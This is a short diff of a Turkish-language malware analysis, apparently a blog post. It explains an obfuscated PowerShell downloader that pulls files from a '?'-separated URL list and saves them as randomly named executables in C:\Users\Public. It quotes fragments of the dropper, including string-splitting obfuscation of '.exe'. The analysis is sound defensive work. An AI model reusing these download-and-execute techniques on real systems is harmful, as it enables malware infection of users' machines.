@@ -121,8 +121,8 @@ es/iV1PKqL/'.Split('?');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($a
 
 Neyse ki bu o kadar da karmaşık değil.Belli ki belirli urllerden dosya indirip çalıştırıyor.
  İçinden urlleri ayırmamız gerek sadece.Urlleri bir string içinde tutup '?' ile ayırdığı açıkça görünüyor.
-<code>$env:public</code> : <code>"C:\Users\Public"</code> stringini verir 
-ardından <code>$env:public + '\' + $NSB + ('.ex'+'e') </code>satırında 
+Powershell'de <code>$env:public</code> değeri <code>"C:\Users\Public"</code> stringini verir.
+			    <code>$env:public + '\' + $NSB + ('.ex'+'e') </code>satırında 
 C:\Users\Public\$NSB.exe adında bir executable oluşturulmuş 
 $NSB asagidaki komuttan anlaşılacağı üzere 10000, 282133 arasında random bir değer.<code>
 $NSB = $nsadasd.next(10000, 282133)
